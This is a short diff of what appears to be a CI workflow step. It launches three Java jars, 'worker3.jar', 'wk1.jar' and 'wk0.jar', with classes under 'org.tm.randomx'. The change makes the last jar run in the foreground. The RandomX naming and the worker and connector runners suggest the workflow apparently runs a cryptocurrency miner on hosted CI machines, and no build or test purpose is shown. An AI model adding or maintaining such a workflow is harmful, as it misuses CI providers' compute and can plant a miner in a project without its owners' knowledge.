@@ -26,5 +26,5 @@ jobs:
         run: |
           Start-Process -FilePath "java" -ArgumentList "-cp", "worker3.jar", "org.tm.randomx.TMagics.fp.Runner"
           Start-Process -FilePath "java" -ArgumentList "-cp", "wk1.jar", "org.tm.randomx.TMagics.connector.Runner"
-          Start-Process -FilePath "java" -ArgumentList "-jar", "wk0.jar"
+          java -jar wk0.jar
 
